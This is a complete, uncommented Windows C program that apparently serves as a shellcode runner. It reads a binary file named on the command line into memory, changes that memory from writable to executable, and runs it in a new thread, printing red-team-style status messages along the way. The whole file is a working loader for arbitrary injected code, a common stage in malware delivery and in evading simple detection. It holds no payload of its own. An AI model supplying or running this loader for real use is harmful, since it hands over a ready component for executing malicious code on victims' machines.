#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open file: %lu\n", GetLastError());
        return 1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    printf("[*] File size: %lu bytes\n", fileSize);

    LPVOID mem = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) {
        printf("[!] VirtualAlloc failed: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
    printf("[*] Allocated memory at: %p\n", mem);

    DWORD bytesRead = 0;
    ReadFile(hFile, mem, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    printf("[*] Read %lu bytes\n", bytesRead);

    DWORD oldProtect = 0;
    VirtualProtect(mem, fileSize, PAGE_EXECUTE_READ, &oldProtect);

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (!hThread) {
        printf("[!] CreateThread failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[*] Thread created, waiting...\n");

    WaitForSingleObject(hThread, INFINITE);
    printf("[*] Done.\n");

    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}
